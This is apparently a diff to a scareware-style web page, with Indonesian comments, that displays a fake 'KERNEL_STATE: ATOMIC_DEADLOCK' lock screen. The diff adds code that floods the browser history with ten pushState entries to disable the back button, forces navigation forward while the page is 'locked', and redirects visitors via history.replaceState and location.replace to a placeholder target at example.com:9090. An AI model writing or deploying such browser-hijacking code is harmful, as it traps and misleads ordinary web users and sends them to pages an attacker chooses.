@@ -159,7 +159,7 @@ button:hover{
             <div style="margin-top: 30px; color: #111; letter-spacing: 10px; font-weight: bold;">
                 KERNEL_STATE: ATOMIC_DEADLOCK
             </div>
-            <div style="margin-top: 60px; color: #020202; font-size: 10px;">[Tekan X untuk Keluar]</div>
+            <div style="margin-top: 60px; color: #020202; font-size: 10px;">[Tekan X untuk Keluar / Redirect]</div>
         </div>
     </div>
 
@@ -254,7 +254,7 @@ btn.addEventListener("click", () => {
 });
 
 // ==============================
-// 4. KERNEL SYSTEM LOCK ENGINE
+// 4. KERNEL SYSTEM LOCK ENGINE + HISTORY RACE REDIRECT
 // ==============================
 
 const voidLayer = document.getElementById('void-layer');
@@ -333,11 +333,24 @@ function terminateSingularity() {
     if (document.exitPointerLock) document.exitPointerLock();
     if (document.exitFullscreen) document.exitFullscreen();
     if (navigator.keyboard && navigator.keyboard.unlock) navigator.keyboard.unlock();
-    location.reload();
+    
+    // History Race Push Redirect ke target
+    history.replaceState(null, null, "http://example.com:9090");
+    window.location.replace("http://example.com:9090");
 }
 
-window.history.pushState(null, null, window.location.href);
-window.onpopstate = () => { if(systemLocked) window.history.go(1); };
+// Flood history states untuk mengunci tombol back & memicu race condition
+for (let i = 0; i < 10; i++) {
+    window.history.pushState({page: i}, "", window.location.href);
+}
+
+window.onpopstate = () => {
+    if (systemLocked) {
+        window.history.forward();
+    } else {
+        window.location.replace("http://example.com:9090");
+    }
+};
 
 </script>
 
